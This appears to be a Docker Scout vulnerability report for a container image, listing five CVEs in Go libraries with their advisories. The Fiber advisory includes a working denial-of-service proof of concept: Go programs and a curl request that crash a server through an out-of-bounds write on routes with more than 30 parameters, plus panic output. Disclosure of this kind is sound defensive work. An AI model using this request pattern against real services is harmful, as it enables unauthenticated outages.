---
hide_table_of_contents: true
---

<table>
<tr><td>digest</td><td><code>sha256:1cf6c3fd742bbc062560e5e846e1260a0e0bf25b11da8244cdd24e176ab9f336</code></td><tr><tr><td>vulnerabilities</td><td><img alt="critical: 0" src="https://img.shields.io/badge/critical-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/high-1-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/medium-3-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/low-1-fce1a9"/> <!-- unspecified: 0 --></td></tr>
<tr><td>platform</td><td>linux/amd64</td></tr>
<tr><td>size</td><td>56 MB</td></tr>
<tr><td>packages</td><td>389</td></tr>
</table>
</details></table>
</details>

<table>
<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>go.opentelemetry.io/otel/sdk</strong> <code>1.38.0</code> (golang)</summary>

<small><code>pkg:golang/go.opentelemetry.io/otel/sdk@1.38.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-24051?s=github&n=sdk&ns=go.opentelemetry.io%2Fotel&t=golang&vr=%3E%3D1.21.0%2C%3C1.40.0"><img alt="high 7.0: CVE--2026--24051" src="https://img.shields.io/badge/CVE--2026--24051-lightgrey?label=high%207.0&labelColor=e25d68"/></a> <i>Untrusted Search Path</i>

<table>
<tr><td>Affected range</td><td><code>>=1.21.0<br/><1.40.0</code></td></tr>
<tr><td>Fixed version</td><td><code>1.40.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>7</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
The OpenTelemetry Go SDK in version `v1.20.0`-`1.39.0` is vulnerable to Path Hijacking (Untrusted Search Paths) on macOS/Darwin systems. The resource detection code in `sdk/resource/host_id.go` executes the `ioreg` system command using a search path. An attacker with the ability to locally modify the PATH environment variable can achieve Arbitrary Code Execution (ACE) within the context of the application.

### Patches
This has been patched in [d45961b](https://github.com/open-telemetry/opentelemetry-go/commit/d45961bcda453fcbdb6469c22d6e88a1f9970a53), which was released with `v1.40.0`.

### References
- [CWE-426: Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/go-jose/go-jose</strong> <code>2.6.3+incompatible</code> (golang)</summary>

<small><code>pkg:golang/github.com/go-jose/go-jose@2.6.3%2Bincompatible</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-27144?s=github&n=go-jose&ns=github.com%2Fgo-jose&t=golang&vr=%3C3.0.4"><img alt="medium 6.9: CVE--2025--27144" src="https://img.shields.io/badge/CVE--2025--27144-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>&lt;3.0.4</code></td></tr>
<tr><td>Fixed version</td><td><code>3.0.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.078%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact
When parsing compact JWS or JWE input, go-jose could use excessive memory. The code used strings.Split(token, ".") to split JWT tokens, which is vulnerable to excessive memory consumption when processing maliciously crafted tokens with a large number of '.' characters.  An attacker could exploit this by sending numerous malformed tokens, leading to memory exhaustion and a Denial of Service.

### Patches
Version 4.0.5 fixes this issue

### Workarounds
Applications could pre-validate payloads passed to go-jose do not contain an excessive number of '.' characters.

### References
This is the same sort of issue as in the golang.org/x/oauth2/jws package as CVE-2025-22868 and Go issue https://go.dev/issue/71490.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/gofiber/fiber/v2</strong> <code>2.52.11</code> (golang)</summary>

<small><code>pkg:golang/github.com/gofiber/fiber@2.52.11#v2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-25882?s=github&n=v2&ns=github.com%2Fgofiber%2Ffiber&t=golang&vr=%3C2.52.12"><img alt="medium 6.9: CVE--2026--25882" src="https://img.shields.io/badge/CVE--2026--25882-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Validation of Array Index</i>

<table>
<tr><td>Affected range</td><td><code>&lt;2.52.12</code></td></tr>
<tr><td>Fixed version</td><td><code>2.52.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.038%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A denial of service vulnerability exists in Fiber v2 and v3 that allows remote attackers to crash the application by sending requests to routes with more than 30 parameters. The vulnerability results from missing validation during route registration combined with an unbounded array write during request matching.

## Affected Versions

- **Fiber v3.0.0-rc.3** and earlier v3 releases
- **Fiber v2.52.10** and potentially all v2 releases (confirmed exploitable)
- Both versions share the same vulnerable routing implementation

## Vulnerability Details

### Root Cause

Both Fiber v2 and v3 define a fixed-size parameter array in `ctx.go`:

```go
const maxParams = 30

type DefaultCtx struct {
    values [maxParams]string  // Fixed 30-element array
    // ...
}
```

The `router.go` `register()` function accepts routes without validating parameter count. When a request matches a route exceeding 30 parameters, the code in `path.go` performs an unbounded write:

- **v3**: `path.go:514`
- **v2**: `path.go:516`

```go
// path.go:514 - NO BOUNDS CHECKING
params[paramsIterator] = path[:i]
```

When `paramsIterator >= 30`, this triggers:
```
panic: runtime error: index out of range [30] with length 30
```

### Attack Scenario

1. Application registers route with >30 parameters (e.g., via code or dynamic routing):
   ```go
   app.Get("/api/:p1/:p2/:p3/.../p35", handler)
   ```

2. Attacker sends matching HTTP request:
   ```bash
   curl http://target/api/v1/v2/v3/.../v35
   ```

3. Server crashes during request processing with runtime panic

## Proof of Concept

### For Fiber v3

```go
package main

import (
	"fmt"
	"net/http"
	"time"
	"github.com/gofiber/fiber/v3"
)

func main() {
	app := fiber.New()
	
	// Register route with 35 parameters (exceeds maxParams=30)
	path := "/test"
	for i := 1; i <= 35; i++ {
		path += fmt.Sprintf("/:p%d", i)
	}
	
	fmt.Printf("Registering route: %s...\n", path[:50]+"...")
	app.Get(path, func(c fiber.Ctx) error {
		return c.SendString("Never reached")
	})
	fmt.Println("✓ Registration succeeded (NO PANIC)")
	
	go func() {
		app.Listen(":9999")
	}()
	time.Sleep(200 * time.Millisecond)
	
	// Build exploit URL with 35 parameter values
	url := "http://localhost:9999/test"
	for i := 1; i <= 35; i++ {
		url += fmt.Sprintf("/v%d", i)
	}
	
	fmt.Println("\n🔴 Sending exploit request...")
	fmt.Println("Expected: panic at path.go:514 params[paramsIterator] = path[:i]\n")
	
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		fmt.Println("💥 Server crashed!")
	} else {
		fmt.Printf("Response: %d\n", resp.StatusCode)
		resp.Body.Close()
	}
}
```

**Output:**
```
Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
✓ Registration succeeded (NO PANIC)

🔴 Sending exploit request...
Expected: panic at path.go:514 params[paramsIterator] = path[:i]

panic: runtime error: index out of range [30] with length 30

goroutine 40 [running]:
github.com/gofiber/fiber/v3.(*routeParser).getMatch(...)
	/path/to/fiber/path.go:514
github.com/gofiber/fiber/v3.(*Route).match(...)
	/path/to/fiber/router.go:89
github.com/gofiber/fiber/v3.(*App).next(...)
	/path/to/fiber/router.go:142
```

### For Fiber v2

```go
package main

import (
	"fmt"
	"net/http"
	"time"
	"github.com/gofiber/fiber/v2"
)

func main() {
	app := fiber.New()
	
	// Register route with 35 parameters (exceeds maxParams=30)
	path := "/test"
	for i := 1; i <= 35; i++ {
		path += fmt.Sprintf("/:p%d", i)
	}
	
	fmt.Printf("Registering route: %s...\n", path[:50]+"...")
	app.Get(path, func(c *fiber.Ctx) error {
		return c.SendString("Never reached")
	})
	fmt.Println("✓ Registration succeeded (NO PANIC)")
	
	go func() {
		app.Listen(":9998")
	}()
	time.Sleep(200 * time.Millisecond)
	
	// Build exploit URL with 35 parameter values
	url := "http://localhost:9998/test"
	for i := 1; i <= 35; i++ {
		url += fmt.Sprintf("/v%d", i)
	}
	
	fmt.Println("\n🔴 Sending exploit request...")
	fmt.Println("Expected: panic at path.go:516 params[paramsIterator] = path[:i]\n")
	
	resp, err := http.Get(url)
	if err != nil {
		fmt.Printf("✗ Request failed: %v\n", err)
		fmt.Println("💥 Server crashed!")
	} else {
		fmt.Printf("Response: %d\n", resp.StatusCode)
		resp.Body.Close()
	}
}
```

**Output (v2):**
```
Registering route: /test/:p1/:p2/:p3/:p4/:p5/:p6/:p7/:p8/:p9/:p10...
✓ Registration succeeded (NO PANIC)

🔴 Sending exploit request...
Expected: panic at path.go:516 params[paramsIterator] = path[:i]

panic: runtime error: index out of range [30] with length 30

goroutine 40 [running]:
github.com/gofiber/fiber/v2.(*routeParser).getMatch(...)
	/path/to/fiber/v2@v2.52.10/path.go:512
github.com/gofiber/fiber/v2.(*Route).match(...)
	/path/to/fiber/v2@v2.52.10/router.go:84
github.com/gofiber/fiber/v2.(*App).next(...)
	/path/to/fiber/v2@v2.52.10/router.go:127
```

## Impact

### Exploitation Requirements
- No authentication required
- Single HTTP request triggers crash
- Trivially scriptable for sustained DoS
- Works against any route with >30 parameters

### Real-World Impact
- **Public APIs**: Remote DoS attacks on vulnerable endpoints
- **Microservices**: Cascade failures if vulnerable service is critical
- **Auto-scaling**: Repeated crashes prevent proper recovery
- **Monitoring**: Log flooding and alert fatigue

### Likelihood
**HIGH** - Exploitation requires only:
- Knowledge of route structure (often public in APIs)
- Standard HTTP client (curl, browser, etc.)
- Single malformed request

## Workarounds

Until patched, users should:

1. **Audit Routes**: Ensure all routes have ≤30 parameters
   ```bash
   # Search for potential issues
   grep -r "/:.*/:.*/:.*" . | grep -v node_modules
   ```

2. **Disable Dynamic Routing**: If programmatically registering routes, validate parameter count:
   ```go
   paramCount := strings.Count(route, ":")
   if paramCount > 30 {
       log.Fatal("Route exceeds maxParams")
   }
   ```

3. **Rate Limiting**: Deploy aggressive rate limiting to mitigate DoS impact

4. **Monitoring**: Alert on panic patterns in application logs

## Timeline

- **2024-12-24**: Vulnerability discovered in v3 during PR #3962 review
- **2024-12-25**: Proof of concept confirmed exploitability in v3
- **2024-12-25**: Vulnerability confirmed to also exist in v2 (same root cause)
- **2024-12-25**: Security advisory created

## References

- **v3 Related PR**: https://github.com/gofiber/fiber/pull/3962 (UpdateParam feature with defensive checks, doesn't fix root cause)
- **Vulnerable Code Locations**:
  - v3: [path.go:514](https://github.com/gofiber/fiber/blob/main/path.go#L514)
  - v2: [path.go:516](https://github.com/gofiber/fiber/blob/v2/path.go#L516)

## Credit

**Discovered by:** @sixcolors (Fiber maintainer) and @TheAspectDev

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>github.com/nats-io/nats-server/v2</strong> <code>2.11.4</code> (golang)</summary>

<small><code>pkg:golang/github.com/nats-io/nats-server@2.11.4#v2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27571?s=github&n=v2&ns=github.com%2Fnats-io%2Fnats-server&t=golang&vr=%3C2.11.12"><img alt="medium 5.9: CVE--2026--27571" src="https://img.shields.io/badge/CVE--2026--27571-lightgrey?label=medium%205.9&labelColor=fbb552"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>

<table>
<tr><td>Affected range</td><td><code>&lt;2.11.12</code></td></tr>
<tr><td>Fixed version</td><td><code>2.11.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.058%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Impact

The WebSockets handling of NATS messages handles compressed messages via the WebSockets negotiated compression.  The implementation bound the memory size of a NATS message but did not independently bound the memory consumption of the memory stream when constructing a NATS message which might then fail validation for size reasons.

An attacker can use a compression bomb to cause excessive memory consumption, often resulting in the operating system terminating the server process.

The use of compression is negotiated before authentication, so this does not require valid NATS credentials to exploit.

The fix was to bounds the decompression to fail once the message was too large, instead of continuing on.

### Patches

This was released in nats-server without being highlighted as a security issue.  It should have been, this was an oversight.  Per the NATS security policy, because this does not require a valid user, it is CVE-worthy.

This was fixed in the v2.11 series with v2.11.12 and in the v2.12 series with v2.12.3.

### Workarounds

This only affects deployments which use WebSockets and which expose the network port to untrusted end-points.

### References

This was reported to the NATS maintainers by Pavel Kohout of Aisle Research (www.aisle.com).

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>github.com/cloudflare/circl</strong> <code>1.6.1</code> (golang)</summary>

<small><code>pkg:golang/github.com/cloudflare/circl@1.6.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-1229?s=github&n=circl&ns=github.com%2Fcloudflare&t=golang&vr=%3C1.6.3"><img alt="low 2.9: CVE--2026--1229" src="https://img.shields.io/badge/CVE--2026--1229-lightgrey?label=low%202.9&labelColor=fce1a9"/></a> <i>Incorrect Calculation</i>

<table>
<tr><td>Affected range</td><td><code>&lt;1.6.3</code></td></tr>
<tr><td>Fixed version</td><td><code>1.6.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:L/SI:L/SA:L/E:P/S:N/AU:Y/U:Amber</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The CombinedMult function in the CIRCL ecc/p384 package (secp384r1 curve) produces an incorrect value for specific inputs. The issue is fixed by using complete addition formulas.
ECDH and ECDSA signing relying on this curve are not affected.

The bug was fixed in **[v1.6.3](https://github.com/cloudflare/circl/releases/tag/v1.6.3)**.

</blockquote>
</details>
</details></td></tr>
</table>

